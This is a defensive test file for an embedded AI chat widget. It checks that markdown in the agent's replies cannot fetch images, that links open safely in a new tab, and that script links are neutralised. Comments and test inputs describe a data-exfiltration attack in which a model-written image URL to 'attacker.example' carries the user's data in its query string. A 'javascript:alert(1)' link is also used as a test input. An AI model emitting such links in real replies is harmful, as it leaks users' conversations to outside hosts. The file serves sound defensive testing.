/**
 * Links in the agent's answer, rendered by the real markdown pipeline.
 *
 * The packaged chat lives inside somebody else's application, so a link the
 * model wrote — often lifted out of a web-search result or an attachment —
 * must not replace the host app in its own tab. The whole stack below the
 * assertion is real: a scripted engine stream through the real client, the real
 * runtime, the vendored <Thread /> and react-markdown. In particular the import
 * rewrite in `scripts/chat/sync-registry.mjs` is under test here — without it
 * the thread renders the vendored `MarkdownText` directly and every link is a
 * same-tab navigation again, with nothing else to say so.
 */
import React from 'react';
import { act, render, screen, waitFor } from '@testing-library/react';
import { beforeAll, beforeEach, describe, expect, it, vi } from 'vitest';

vi.mock('../../src/client', () => ({
  T2VClient: vi.fn().mockImplementation(() => ({
    request: vi.fn().mockResolvedValue({ data: [] }),
    streamRequest: vi.fn(),
    uploadRequest: vi.fn(),
  })),
}));
vi.mock('../../src/auth', () => ({
  T2VAuth: vi.fn().mockImplementation(() => ({
    onAuthStateChange: vi.fn().mockReturnValue(() => {}),
    getUser: vi.fn().mockReturnValue(null),
    isAnonymous: vi.fn().mockReturnValue(false),
    startAnonymous: vi.fn().mockResolvedValue(null),
    // listen()/destroy() are an inverse pair; the chat provider calls both.
    listen: vi.fn(),
    destroy: vi.fn(),
  })),
}));
vi.mock('../../src/tools', () => ({
  T2VTools: vi.fn().mockImplementation(() => ({
    reRegister: vi.fn().mockResolvedValue(null),
    register: vi.fn().mockResolvedValue({ registered: [], count: 0 }),
    handle: vi.fn(),
  })),
  stripNullArgs: (args: Record<string, unknown>) => args,
}));
vi.mock('../../src/skills', () => ({
  // A stub that answers the whole surface the client uses: createSession
  // re-registers the end-user's skills, so a bare {} breaks every test
  // that starts a session.
  T2VSkills: vi.fn().mockImplementation(() => ({
    getAll: () => [],
    load: () => [],
    add: () => {},
    remove: () => false,
    save: () => {},
    clear: () => {},
    register: async () => ({ registered: [], count: 0 }),
  })),
}));

import { Talk2View } from '../../src/index';
import { Talk2ViewChat } from '../../src/chat/chat';
import type { ChatEvent } from '../../src/types';

beforeAll(() => {
  class RO {
    observe() {}
    unobserve() {}
    disconnect() {}
  }
  (globalThis as unknown as { ResizeObserver: typeof RO }).ResizeObserver = RO;
  Element.prototype.scrollTo = Element.prototype.scrollTo ?? (() => {});
  window.matchMedia = (() => ({
    matches: false,
    media: '',
    onchange: null,
    addEventListener() {},
    removeEventListener() {},
    addListener() {},
    removeListener() {},
    dispatchEvent: () => false,
  })) as unknown as typeof window.matchMedia;
});

beforeEach(() => {
  // Conversations are kept in localStorage, so a chat mounted in the next test
  // would otherwise open the one the last test left behind.
  localStorage.clear();
});

/** Answer once, with `markdown`, and hand back the rendered anchors. */
async function answer(markdown: string): Promise<HTMLAnchorElement[]> {
  const t2v = new Talk2View({ partnerKey: 'pk_test_x', anonymousAutoStart: false });
  const events: ChatEvent[] = [{ type: 'text', content: markdown }, { type: 'done', threadId: 'th' }];
  vi.spyOn(t2v, 'chat' as never).mockImplementation((() =>
    (async function* () {
      for (const e of events) yield e;
    })()) as never);

  render(<Talk2ViewChat client={t2v} />);
  await screen.findByRole('heading', { name: /how can i help/i });
  await act(async () => {
    await t2v.sendMessage('cite something').catch(() => {});
  });
  await waitFor(() => expect(document.querySelectorAll('.aui-md a').length).toBeGreaterThan(0));
  return [...document.querySelectorAll<HTMLAnchorElement>('.aui-md a')];
}

/** Answer once with `markdown` and wait for the rendered reply, link or not. */
async function reply(markdown: string): Promise<HTMLElement> {
  const t2v = new Talk2View({ partnerKey: 'pk_test_x', anonymousAutoStart: false });
  const events: ChatEvent[] = [{ type: 'text', content: markdown }, { type: 'done', threadId: 'th' }];
  vi.spyOn(t2v, 'chat' as never).mockImplementation((() =>
    (async function* () {
      for (const e of events) yield e;
    })()) as never);

  render(<Talk2ViewChat client={t2v} />);
  await screen.findByRole('heading', { name: /how can i help/i });
  await act(async () => {
    await t2v.sendMessage('cite something').catch(() => {});
  });
  await waitFor(() => expect(document.querySelector('.aui-md')).toBeTruthy());
  return document.querySelector('.aui-md') as HTMLElement;
}

describe('an image the agent wrote', () => {
  /**
   * ADR 0009: a reply is untrusted, and nothing in it may fetch on its own.
   * An image is the sharpest case, because the model chooses both the host and
   * the query string: `![](https://attacker.example/x.png?d=<the user's data>)`
   * renders, the browser GETs it, and the conversation has left the building
   * with nobody clicking anything. `/ui` has refused images since that ADR;
   * the packaged chat is the recommended surface now and has to refuse them too.
   */
  it('never loads it — the reply cannot make the browser fetch', async () => {
    const rendered = await reply('![a diagram](https://attacker.example/x.png?d=leak)');
    expect(rendered.querySelectorAll('img')).toHaveLength(0);
  });

  it('shows it as a link the end-user may choose to open, naming the host', async () => {
    const rendered = await reply('![a diagram](https://attacker.example/x.png?d=leak)');
    const links = [...rendered.querySelectorAll<HTMLAnchorElement>('a')];
    const image = links.find((a) => a.textContent?.startsWith('Image'));
    expect(image).toBeTruthy();
    expect(image!.textContent).toBe('Image: a diagram (attacker.example)');
    expect(image!.getAttribute('href')).toBe('https://attacker.example/x.png?d=leak');
    expect(image!.getAttribute('target')).toBe('_blank');
    expect(image!.getAttribute('rel')).toBe('noopener noreferrer');
  });

  it('keeps the label but drops the destination for a scheme that is not the web', async () => {
    const rendered = await reply('![x](data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=)');
    expect(rendered.querySelectorAll('img')).toHaveLength(0);
    expect(rendered.textContent).toContain('Image: x');
    expect(rendered.querySelectorAll('a')).toHaveLength(0);
  });
});

describe('a link the agent wrote', () => {
  it('opens beside the host app, never in its tab', async () => {
    const [link] = await answer('See [the paper](https://example.org/paper) for the method.');
    expect(link!.getAttribute('href')).toBe('https://example.org/paper');
    expect(link!.getAttribute('target')).toBe('_blank');
    // noopener: the opened page must not reach back through window.opener.
    // noreferrer: it must not be handed the partner's own URL either.
    expect(link!.getAttribute('rel')).toBe('noopener noreferrer');
  });

  it('keeps the chat’s own link styling', async () => {
    // A component passed in `components` replaces upstream's default rather
    // than wrapping it, so the classes have to be carried across by hand.
    const [link] = await answer('[a link](https://example.org)');
    expect(link!.className).toContain('aui-md-a');
    expect(link!.className).toContain('text-primary');
  });

  it('still neutralises a javascript: href', async () => {
    // react-markdown's defaultUrlTransform, not us — asserted here because this
    // is the file someone will read when they wonder who is guarding links.
    const [link] = await answer('[tap me](javascript:alert(1))');
    expect(link!.getAttribute('href')).toBe('');
    expect(link!.getAttribute('target')).toBe('_blank');
  });
});
